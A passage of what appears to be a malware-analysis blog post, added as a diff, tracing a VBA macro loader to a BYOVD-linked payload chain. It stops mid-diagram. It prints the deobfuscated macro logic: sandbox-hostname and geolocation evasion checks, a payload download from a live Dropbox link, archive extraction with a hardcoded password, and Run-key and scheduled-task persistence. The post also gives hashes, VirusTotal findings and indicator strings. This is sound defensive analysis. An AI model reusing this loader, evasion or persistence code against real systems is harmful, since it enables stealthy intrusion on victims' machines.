@@ -1,0 +1,473 @@
+---
+title: "Investigation Notes: From an Obfuscated VBA Macro to a BYOVD Payload Chain"
+description: "A hands-on walkthrough of a live multi-stage loader, correlated to the publicly reported FAUX#ELEVATE toolkit: a VBA macro that gatekeeps on domain membership, geography, and nine known sandbox hostnames before it ever drops a binary, two layers of persistence, three UPX-packed payloads with VirusTotal corroboration, and a byte-identical vulnerable signed driver."
+date: "2026-07-29"
+author: "Mohamed Habib Jaouadi"
+tags: ["malware-analysis", "reverse-engineering", "incident-response", "byovd", "detection-engineering", "blue-team", "cryptojacking"]
+banner: "/banners/posts/malware-investigation-byovd-loader.jpg"
+bannerAlt: "Lines of code displayed on a dark computer screen, evoking a reverse engineer working through a disassembler"
+visibility: "public"
+---
+
+> **Investigation Focus:** This is a working investigation, not a finished report. Every claim below is marked by how it was established: import tables and strings establish capability, a VirusTotal detonation or a published report from a related sample establishes corroboration, and neither is treated as proof of what this specific sample's own code does until that's traced directly. The open question at the end is left open because it actually is.
+
+**TL;DR:** A VBA macro, obfuscated by assigning every string literal to a nonsense-word variable name instead of encoding it and padded with junk comment lines, gatekeeps on three checks before writing anything to disk: domain membership, a nine-entry hardcoded sandbox hostname blocklist spanning two distinct naming styles, and the host's country via a plaintext geolocation API, refusing Russia and the United States. Past the gate it downloads the real `7zr.exe` from `7-zip.org` and a password-protected archive from Dropbox, extracts three <Term concept="upx">UPX</Term>-packed executables plus a scheduled task definition, and installs two independent persistence mechanisms pointing at the same binary. `ms.exe` carries process-injection capability and gets 51/70 on VirusTotal with spyware/stealer-leaning labels, and its own sandbox detonation shows it calling the exact same geofencing endpoint as the macro. `RuntimeHost.exe` carries named Sandboxie/Cuckoo/VirtualBox/VMware checks, gets 24/70, and its detonation recorded a dropped `v32.dll` matching a string already in this capture's own VBA table. Both share an ESET `AIKJ` family suffix. A vulnerable signed driver, `WinRing0x64.sys`, sits in the same folder with a hash that is byte-identical to one documented in Securonix's public FAUX#ELEVATE report, a related but not identical campaign that shares this capture's archive name, archive password, and binary-naming convention while diverging on at least one payload's actual hash; that related sample uses the driver for mining-performance MSR tuning, but this capture's own stealer-leaning vendor labels and absent miner binary make the driver's actual, better-documented <Term concept="byovd">CVE-2020-14979</Term> privilege-escalation path at least as plausible here, and that fork is where the investigation currently stands.
+
+## Introduction
+
+Most malware write-ups read like the ending was known from the start. This one is published closer to where the investigation actually stands: a first-stage script has been fully deobfuscated and its logic is well understood, three second-stage binaries have been triaged by import table, string, and VirusTotal corroboration, this capture overlaps enough with a named public campaign to be worth correlating directly, and one genuinely open question, which component is responsible for a vulnerable driver sitting in the same staging folder, has not been answered yet. That gap is left in deliberately, because the discipline that got the investigation this far is the same discipline that matters for the reader: a binary importing `VirtualAllocEx` and `WriteProcessMemory` has the *capability* for process injection, not proof of it, and a related sample's public report explaining what a byte-identical driver is used for is corroboration, not confirmation for this capture's own binaries. The difference only gets resolved by tracing what this specific code actually does, not by what it merely imports or what a related sample was found doing.
+
+## Stage 0: A VBA Macro That Doesn't Encode, It Renames
+
+The initial script is a VBA macro, and its obfuscation approach is unusual enough to be worth describing on its own. Rather than base64 or XOR-encoding its strings, every literal the script needs, URLs, registry paths, filenames, HTTP headers, is assigned once to a uniquely-named variable built from concatenated, grammatically plausible but meaningless English-looking words:
+
+```vb
+unnomadically_skewered_aristos_denials_germlike_wrenches_lowsest_supermechanically_recoverableness_rhythmicity_interdetermine_enureses = "https://www.dropbox.com/scl/fi/1k7ednk2dz21bvjy1i057/gmail2.7z?..."
+```
+
+The delivered file is padded far beyond that assignment block, almost entirely with junk comment lines built from real English sentence fragments rather than code, which is what actually defeats naive detection: a file that's mostly comments and nonsense-named assignments statistically resembles nothing in particular. The extraction method was mechanical rather than manual line-by-line reading: isolate every line that is not wrapped start-to-end in a quoted literal, since the junk padding is formatted as standalone commented or quoted filler and the handful of real executable lines are not, which collapses a file of that scale down to the actual logic in one pass. (A public writeup of a related campaign, discussed below, independently measured this same padding technique at 224,471 total lines with only 266 of them executable, which lines up with how disproportionate the padding felt here.)
+
+Turning that filtered output into something readable was a small two-stage pipeline rather than a hand edit. The first pass is a short Python script that reads only the assignment block, splits each line into its variable name and literal, and resolves anything built with a VBScript `Replace(...)` call rather than a flat string, since a handful of the assigned values aren't plain literals at all but the result of a nested `Replace(Replace("...", "...", "..."), "...", "...")` expression, which meant writing a small recursive evaluator for VBScript's `Replace` semantics (including its 1-based `start` and `compare` parameters) rather than just reading the string off the line. The second pass is a general constant-propagation script: it builds a case-insensitive symbol table from every `variable = "literal"` assignment in the whole file, VBScript identifiers are case-insensitive, which matters for matching, then walks every other line and substitutes each variable reference with its literal value inline, skipping comments and the assignment lines themselves. The output of that second pass is what the code blocks in this post are drawn from, further retyped here with VBScript's own internal short helper-variable names (the macro's own `L5...L5`-style object references, distinct from the long nonsense-word string-literal names) left intact, since those are genuinely short and add no obfuscation value once the literals are resolved.
+
+The rest of the script then reads as if every operation takes a meaningless argument, until each variable is resolved back to its assigned string. Once deobfuscated, the script's first real decisions are three gates, evaluated before anything gets written to disk. Every code block below is the script's real logic with the nonsense variable names resolved back to readable ones and the inline `CreateObject` ProgID strings substituted in; the control flow, comparisons, and literals are exactly as extracted, retyped for legibility rather than copy-pasted with 70-character variable names.
+
+**Domain membership and privilege.** The script runs `Select * From Win32_ComputerSystem` over WMI and checks `PartOfDomain`. Combined with an admin-rights check (attempting a privileged registry read and catching the failure), this branches the script into different paths depending on whether it landed on a domain-joined, non-admin host versus an already-elevated one, each path re-launching itself through `ShellExecute` with the `runas` verb when elevation is needed:
+
+```vb
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+Set wmiService = GetObject("winmgmts:\\.\root\cimv2")
+Set computers = wmiService.ExecQuery("Select * From Win32_ComputerSystem")
+isDomainJoined = False
+For Each computer In computers
+    isDomainJoined = computer.PartOfDomain
+Next
+
+Function IsAdmin()
+    On Error Resume Next
+    shell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
+    IsAdmin = (Err.Number = 0)
+    Err.Clear
+End Function
+```
+
+**A hardcoded sandbox hostname blocklist, in two distinct styles.** The script expands `%computername%` and compares it, by exact string match, against nine hardcoded values, not the four that stand out on a first read. Four follow a recognizable `DESKTOP-XXXXXXX` or named-PC pattern (`DESKTOP-D019GDM`, `DESKTOP-U05E4LC`, `DESKTOP-29MF6G4`, `JOHN-PC`), but five more are short, random-looking eight-character uppercase strings (`JRIWWBPD`, `ZLYTWMBI`, `LDWVFKWJ`, `ONUGVJVT`, `NCCZNUNV`) that don't resemble a normal Windows default hostname at all, closer to whatever a specific automated VM-provisioning or trial-sandbox platform defaults to. If the current hostname matches any of the nine, the script deletes itself and exits immediately:
+
+```vb
+computerName = shell.ExpandEnvironmentStrings("%computername%")
+If computerName = "JOHN-PC" Or computerName = "LDWVFKWJ" Or computerName = "NCCZNUNV" _
+   Or computerName = "DESKTOP-D019GDM" Or computerName = "JRIWWBPD" Or computerName = "ZLYTWMBI" _
+   Or computerName = "ONUGVJVT" Or computerName = "DESKTOP-U05E4LC" Or computerName = "DESKTOP-29MF6G4" Then
+    fso.DeleteFile WScript.ScriptFullName, True
+    WScript.Quit
+End If
+```
+
+None of these are generic patterns or heuristics, they are specific machine identifiers, almost certainly harvested from the operator's own prior sandbox or analyst-VM encounters across more than one analysis platform and hardcoded directly into the macro.
+
+**Geofencing by IP geolocation.** The script requests `http://ip-api.com/csv/?fields=countryCode`, a legitimate, free, unauthenticated geolocation API, over plain HTTP, and compares the returned two-letter code against `RU` and `US`. A match causes a silent exit before any payload is downloaded:
+
+```vb
+Function GetCountry()
+    Dim xmlhttp
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    On Error Resume Next
+    xmlhttp.Open "GET", "http://ip-api.com/csv/?fields=countryCode", False
+    xmlhttp.Send
+    If Err.Number <> 0 Or xmlhttp.Status <> 200 Then
+        GetCountry = "??"
+        Exit Function
+    End If
+    GetCountry = Replace(Replace(xmlhttp.ResponseText, vbCr, ""), vbLf, "")
+End Function
+
+If GetCountry() = "RU" Or GetCountry() = "US" Then
+    WScript.Quit
+End If
+```
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 230" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A decision flow showing the VBA macro's three gates in sequence: a sandbox hostname check against a hardcoded list of nine machine names in two naming styles, a domain-membership and privilege check that branches into an elevation path if needed, and a geolocation check against ip-api.com that exits silently if the country code is RU or US. Only a host that passes all three gates proceeds to download the staged payload.">
+    <rect x="230" y="10" width="180" height="38" rx="7" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.35" />
+    <text x="320" y="34" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Macro executes</text>
+    <rect x="210" y="68" width="220" height="40" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="320" y="92" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Gate 1: hostname in 9-entry list?</text>
+    <rect x="210" y="128" width="220" height="40" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="320" y="146" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Gate 2: domain-joined +</text>
+    <text x="320" y="159" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">admin check (branch/elevate)</text>
+    <rect x="210" y="188" width="220" height="40" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
+    <text x="320" y="206" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Gate 3: ip-api.com country</text>
+    <text x="320" y="219" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">code in (RU, US)?</text>
+    <rect x="470" y="68" width="150" height="40" rx="7" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="545" y="92" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Match: delete</text>
+    <text x="545" y="105" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">self, exit</text>
+    <line x1="320" y1="48" x2="320" y2="68" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adInvA)" />
+    <line x1="320" y1="108" x2="320" y2="128" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adInvA)" />
+    <line x1="320" y1="168" x2="320" y2="188" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adInvA)" />
+    <line x1="430" y1="88" x2="470" y2="88" stroke="#ef4444" strokeOpacity="0.6" strokeWidth="1.1" markerEnd="url(#adInvB)" />
+    <defs>
+      <marker id="adInvA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+      <marker id="adInvB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.7" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>All three checks run before a single payload byte is written to disk. Sandboxing from a flagged hostname, or from an RU/US-geolocated IP, never reaches the interesting part of this script.</p>
+</div>
+
+The combination is worth naming: <Term concept="vm-sandbox-detection">sandbox detection</Term> and <Term concept="geofencing-malware">geofencing</Term> happening at the macro stage itself, in plaintext, interpretable VBScript, before any packed binary is even on disk. That is unusually cheap and unusually effective: an analyst running this inside a VM named after a common sandbox product, or routing traffic through infrastructure that geolocates to the wrong country, gets nothing, not even the archive download.
+
+## Staging: A Real 7-Zip Binary and a Password-Protected Archive
+
+Once past the gates, the macro's staging behavior is simple and leans on legitimate infrastructure to stay quiet. It downloads the genuine, Igor Pavlov-signed `7zr.exe` directly from `https://www.7-zip.org/a/7zr.exe`, the official distribution URL, not a lookalike domain, which means this specific download is not something a defender can usefully blocklist by hash or source. It then downloads `gmail2.7z` from a direct Dropbox share link, and extracts it using the freshly downloaded `7zr.exe` with the command-line flags `e -p1625093 -y -o` (the archive password is in cleartext in the macro's own string table), into `%PUBLIC%\WindowsUpdate\`:
+
+```vb
+Call ShellExecuteAndWait("https://www.7-zip.org/a/7zr.exe", publicFolder & "\7zr.exe")
+Call DownloadFile("https://www.dropbox.com/scl/fi/1k7ednk2dz21bvjy1i057/gmail2.7z?rlkey=0qbro7zvrrrm2kk40ssqvz4hk&st=qu0wegin&dl=1", _
+                   publicFolder & "\WindowsUpdate\gmail2.7z")
+
+shell.Run publicFolder & "\7zr.exe e -p1625093 -y -o" & Chr(34) & publicFolder & "\WindowsUpdate" & Chr(34) & _
+          " " & Chr(34) & publicFolder & "\WindowsUpdate\gmail2.7z" & Chr(34), 0, 0
+```
+
+The archive yields four files: `ms.exe`, `RuntimeHost.exe`, `mservice_L.exe`, and `st.xml`, a scheduled task definition the macro feeds straight to `schtasks.exe /create`.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A five-step horizontal chain: the VBA macro downloads the real 7zr.exe from the official 7-zip.org, downloads a password-protected archive named gmail2.7z from Dropbox, extracts it with the downloaded 7zr.exe using the hardcoded password, and the archive yields four files into the public WindowsUpdate folder: ms.exe, RuntimeHost.exe, mservice_L.exe, and a scheduled task XML named st.xml.">
+    <rect x="5" y="55" width="118" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="64" y="76" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">Download real</text>
+    <text x="64" y="89" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">7zr.exe (7-zip.org)</text>
+    <rect x="138" y="55" width="118" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="197" y="76" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">Download gmail2.7z</text>
+    <text x="197" y="89" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">(Dropbox)</text>
+    <rect x="271" y="55" width="118" height="50" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
+    <text x="330" y="76" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">Extract with</text>
+    <text x="330" y="89" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">hardcoded password</text>
+    <rect x="404" y="40" width="226" height="80" rx="7" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.3" />
+    <text x="517" y="58" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">%PUBLIC%/WindowsUpdate/</text>
+    <text x="517" y="73" textAnchor="middle" fill="currentColor" fontSize="8" fontFamily="monospace">ms.exe</text>
+    <text x="517" y="86" textAnchor="middle" fill="currentColor" fontSize="8" fontFamily="monospace">RuntimeHost.exe</text>
+    <text x="517" y="99" textAnchor="middle" fill="currentColor" fontSize="8" fontFamily="monospace">mservice_L.exe</text>
+    <text x="517" y="112" textAnchor="middle" fill="currentColor" fontSize="8" fontFamily="monospace">st.xml</text>
+    <line x1="123" y1="80" x2="138" y2="80" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.1" markerEnd="url(#adStage)" />
+    <line x1="256" y1="80" x2="271" y2="80" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.1" markerEnd="url(#adStage)" />
+    <line x1="389" y1="80" x2="404" y2="80" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.1" markerEnd="url(#adStage)" />
+    <defs>
+      <marker id="adStage" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+    </defs>
+  </svg>
+</div>
+
+Using the real `7zr.exe`, fetched directly from the vendor at runtime, is a quiet choice: the downloaded binary itself carries a legitimate signature and a clean reputation everywhere, and the archive extraction step produces nothing a signature-based tool flags on its own, since 7-Zip extracting a password-protected archive is completely ordinary behavior.
+
+## Persistence: Two Independent Mechanisms, One Target
+
+The macro installs two separate persistence mechanisms, and both point at the same binary, `mservice_L.exe`.
+
+**A Run key.** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Media Service` is written to point at `%PUBLIC%\WindowsUpdate\mservice_L.exe`, triggering on every interactive logon for the current user.
+
+**A scheduled task.** `st.xml`, extracted from the archive, is registered via `schtasks.exe /create /f /tn MicrosoftUpdateService /XML <path>`. The task itself (read directly from the XML) runs `%public%\windowsupdate\mservice_l.exe` on a 10-minute repeating interval starting from a fixed boundary, with `RunLevel` set to `HighestAvailable`, meaning it inherits the full privilege level of whichever account the task runs under, no further elevation prompt required on each of those 10-minute firings:
+
+```vb
+shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Media Service", _
+               Chr(34) & publicFolder & "\WindowsUpdate\mservice_L.exe" & Chr(34), "REG_SZ"
+
+Call ShellExecuteAndWait("cmd.exe", "/c schtasks.exe /create /f /tn MicrosoftUpdateService /XML " & _
+                          Chr(34) & publicFolder & "\WindowsUpdate\st.xml" & Chr(34))
+```
+
+```xml
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <TimeTrigger>
+      <Repetition><Interval>PT10M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
+      <StartBoundary>2023-02-05T14:31:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal>
+  </Principals>
+  <Actions Context="Author">
+    <Exec>
+      <Command>%public%\windowsupdate\mservice_l.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+```
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "580px" }} role="img" aria-label="Two independent persistence mechanisms converging on the same target: a Run key named Microsoft Media Service that fires on logon, and a scheduled task named MicrosoftUpdateService that fires every 10 minutes with HighestAvailable run level, both pointing at mservice_L.exe in the public WindowsUpdate folder.">
+    <rect x="10" y="20" width="230" height="46" rx="7" fill="#10b981" fillOpacity="0.12" stroke="#10b981" strokeWidth="1.2" />
+    <text x="125" y="40" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Run key: "Microsoft Media</text>
+    <text x="125" y="53" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Service" (fires on logon)</text>
+    <rect x="10" y="84" width="230" height="46" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
+    <text x="125" y="104" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Scheduled task:</text>
+    <text x="125" y="117" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">"MicrosoftUpdateService" (10 min)</text>
+    <rect x="400" y="52" width="230" height="46" rx="7" fill="#ef4444" fillOpacity="0.14" stroke="#ef4444" strokeWidth="1.4" />
+    <text x="515" y="70" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold" fontFamily="monospace">mservice_L.exe</text>
+    <text x="515" y="84" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">PublicWindowsUpdate</text>
+    <line x1="240" y1="43" x2="400" y2="68" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.1" markerEnd="url(#adPersist)" />
+    <line x1="240" y1="107" x2="400" y2="82" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.1" markerEnd="url(#adPersist)" />
+    <defs>
+      <marker id="adPersist" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Two triggers (logon, every 10 minutes) and two removal surfaces (a registry value, a scheduled task) for the same binary. Removing only one leaves the other intact.</p>
+</div>
+
+That redundancy is the practical takeaway for defenders: finding and removing the Run key alone leaves the scheduled task re-launching the binary within 10 minutes, and vice versa. Both have to be removed in the same response action.
+
+## The Three Payloads: Capability, Not Yet Confirmed Behavior
+
+All three extracted executables are <Term concept="upx">UPX</Term>-packed, confirmed by the presence of `UPX0`/`UPX1` sections with the packer's characteristic section flags, and trivially unpacked with `upx -d`. What follows is import-table and string-level triage for each, with the capability-versus-behavior distinction preserved deliberately, since that distinction is the actual finding at this stage, not a hedge. Everything in this section is static analysis only, hashing, PE parsing, and string extraction against the files at rest, none of the samples has been executed.
+
+`sha256sum` against every file in the extracted staging folder gives:
+
+```
+0018f7065bfb601038faefb870bbdadf7b1a37734b31895f9ba9e0de6e7a0ff0  ms.exe
+da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6  RuntimeHost.exe
+11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5  WinRing0x64.sys
+```
+
+A generic web search turns up nothing for `WinRing0x64.sys`'s hash (a different story, covered in the correlation section below), but both `ms.exe` and `RuntimeHost.exe` have VirusTotal records worth reading closely, and one detail from `ms.exe`'s record is a direct behavioral confirmation rather than a hint.
+
+`RuntimeHost.exe`'s hash gets 24 of 69 vendor detections, with no consensus on a specific family: Microsoft calls it `Trojan:Win32/Wacatac.B!ml`, ESET calls it `Win32/Agent.AIKJ`, and the largest cluster (BitDefender, Arcabit, GData, eScan, VIPRE, Emsisoft) labels it generically as `Draftor`, all either generic or ML-confidence detections rather than a named, well-understood malware family, consistent with a loader component that isn't widely circulated. Two details from VirusTotal's own sandbox detonation corroborate this investigation's own findings independently: a community YARA match on `INDICATOR_SUSPICIOUS_EXE_SandboxProductID` and `INDICATOR_SUSPICIOUS_EXE_SandboxHookingDLL` lines up exactly with the named Sandboxie/Cuckoo/VirtualBox strings found by hand below, and the sandbox run recorded one dropped file, `v32.dll`, which matches the `\v32.dll` path string already present in this investigation's own VBA string table (assigned alongside `\katyusha_V`), tying the macro's own internal naming directly to a file `RuntimeHost.exe` actually writes to disk. The same detonation also recorded two contacted IP geolocation services, `api.myip.com` and `ipinfo.io`, and outbound contact to `5.139.44.126` and `5.139.44.127`, both on AS12389 (Rostelecom) in Russia, a detail worth flagging rather than over-reading: it places observed network activity on Russian-registered infrastructure, without establishing whether that's C2, a relay, or incidental to the sandbox's own network path. The sample's first recorded submission filename was `исполняемый.exe`, Russian for "executable.exe," stored as mojibake in VirusTotal's metadata. The hash also appears, per community comments, in a multi-sample batch submission tagged with several unrelated commodity family names (Amadey, Elex, GlassWorm, Luca Stealer, njRAT); that tag describes the submission bundle those researchers uploaded together, not a confirmed family classification of this specific binary, and is listed here as a pivot point rather than an attribution.
+
+`ms.exe`'s hash gets a much higher 51 of 70 vendor detections, and the labels lean spyware/stealer rather than generic: Kaspersky calls it `Trojan-Spy.Win32.Agent`, VBA32 calls it `BScope.TrojanPSW.Stealer`, Antiy calls it `Trojan[PSW]/Win32.Convagent`, and ESET again lands on the same `AIKJ` suffix it gave `RuntimeHost.exe`, two vendors converging on the same family tag for two different binaries from the same staged folder is a second, independent line of evidence for the toolkit-correlation argument above, separate from the shared archive password and driver hash. VirusTotal's behavioral tags for this sample include `detect-debug-environment`, `calls-wmi`, and `spreader`, and the sandbox run recorded one outbound HTTP request that matters more than any string in the import table: `http://ip-api.com/csv/?fields=countryCode`, the exact same geofencing endpoint, same path, same query parameter, that the VBA macro itself queries before downloading anything. That is not a shared library coincidence, it is `ms.exe` independently re-running the operator's own geolocation check at the binary stage, after the macro already ran the same check once. The sandbox run also recorded one dropped file, a copy of the legitimate `taskkill.exe`, consistent with the process-termination capability the import table already suggested via `TerminateProcess`.
+
+**`ms.exe`** carries the specific API sequence that constitutes <Term concept="process-injection">process injection</Term> capability: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `ReadProcessMemory`, alongside `CreateProcessW` paired with `CreatePipe`, suggesting a parent-child process relationship with redirected I/O. It also imports the full BCrypt and legacy CryptoAPI surface (`BCryptEncrypt`/`Decrypt`, `BCryptGenerateKeyPair`, `CryptAcquireContext`), consistent with either protecting its own configuration or implementing a custom protocol. The decisive question, whether the `VirtualAllocEx` → `WriteProcessMemory` sequence is followed by anything that actually transfers execution into the target process (a new remote thread, an overwritten entry point, an APC), has not yet been traced in the disassembler and is explicitly marked unresolved; the VirusTotal spyware/stealer labels above raise the stakes of that question without answering it.
+
+**`RuntimeHost.exe`** (SHA-256 `da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6`) is the most explicit of the three. Its strings include named, product-specific sandbox and VM artifacts rather than generic indicators: `Sandboxie_SingleInstanceMutex_Control`, `SBIE_BOXED_ServiceInitComplete_Mutex1`, `\??\C:\Cuckoo`, `\??\pipe\cuckoo`, `\??\VBoxMiniRdrDN`, `\??\VBoxTrayIPC`, `\??\HGFS`, and `VmGenerationCounter`, alongside hardware-fingerprinting registry reads under `HARDWARE\DESCRIPTION\System\BIOS` and `SYSTEM\CurrentControlSet\Enum\{PCI,USB,HDAUDIO}`. It links a substantial embedded libcurl and libssh2 implementation (HTTP, HTTPS, FTP, SFTP, SOCKS4/5), and the same BCrypt/CryptoAPI surface as `ms.exe`. None of the networking or crypto strings alone prove the sample's own code calls them, both libraries carry large amounts of code that simply ships unused, which is exactly why the next step for this binary is tracing application-level callers into the library rather than the library's own internals.
+
+**`mservice_L.exe`** is a 32-bit PE compiled with PureBasic (confirmed by `PB_*` runtime strings), 546 KB, with a manifest requesting `requireAdministrator`, no exports, and no debug symbols. It is the binary both persistence mechanisms target, which makes it the investigation's current center of gravity. It carries a full registry API surface (`RegCreateKeyW`, `RegSetValueExW`, `RegOpenKeyExW`), process creation (`CreateProcessW` with a direct call site already located), GUI/tray functionality (`Shell_NotifyIconW`, a direct call site located), and the same large embedded libcurl/libssh2 footprint as `RuntimeHost.exe`. Given that it is the explicit target of both persistence mechanisms, the single highest-priority open question for this binary is what command line it actually passes to `CreateProcessW`, since that will establish whether it is a pure watchdog/launcher for the other two binaries or does independent work of its own.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 170" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A summary diagram of the three payloads. ms.exe: process injection capability via OpenProcess, VirtualAllocEx, and WriteProcessMemory, plus BCrypt crypto, injection itself unconfirmed. RuntimeHost.exe: named Sandboxie, Cuckoo, VirtualBox, and VMware detection strings, hardware fingerprinting, and a libcurl/libssh2 network stack. mservice_L.exe: a PureBasic GUI application requesting administrator rights, the explicit target of both persistence mechanisms, with registry, process-creation, and tray functionality.">
+    <rect x="10" y="20" width="195" height="130" rx="8" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.3" />
+    <text x="107" y="40" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold" fontFamily="monospace">ms.exe</text>
+    <text x="107" y="58" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">OpenProcess +</text>
+    <text x="107" y="70" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">VirtualAllocEx +</text>
+    <text x="107" y="82" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">WriteProcessMemory</text>
+    <text x="107" y="100" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">+ BCrypt</text>
+    <text x="107" y="126" textAnchor="middle" fill="currentColor" fontSize="7.5" fontStyle="italic" opacity="0.65">injection: capability</text>
+    <text x="107" y="138" textAnchor="middle" fill="currentColor" fontSize="7.5" fontStyle="italic" opacity="0.65">only, unconfirmed</text>
+    <rect x="222" y="20" width="195" height="130" rx="8" fill="#f59e0b" fillOpacity="0.1" stroke="#f59e0b" strokeWidth="1.3" />
+    <text x="319" y="40" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold" fontFamily="monospace">RuntimeHost.exe</text>
+    <text x="319" y="58" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">Named Sandboxie /</text>
+    <text x="319" y="70" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">Cuckoo / VBox / VMware</text>
+    <text x="319" y="82" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">detection strings</text>
+    <text x="319" y="100" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">+ HW fingerprinting</text>
+    <text x="319" y="112" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">+ libcurl/libssh2</text>
+    <rect x="434" y="20" width="195" height="130" rx="8" fill="#0ea5e9" fillOpacity="0.1" stroke="#0ea5e9" strokeWidth="1.3" />
+    <text x="531" y="40" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold" fontFamily="monospace">mservice_L.exe</text>
+    <text x="531" y="58" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">PureBasic, requires</text>
+    <text x="531" y="70" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">Administrator</text>
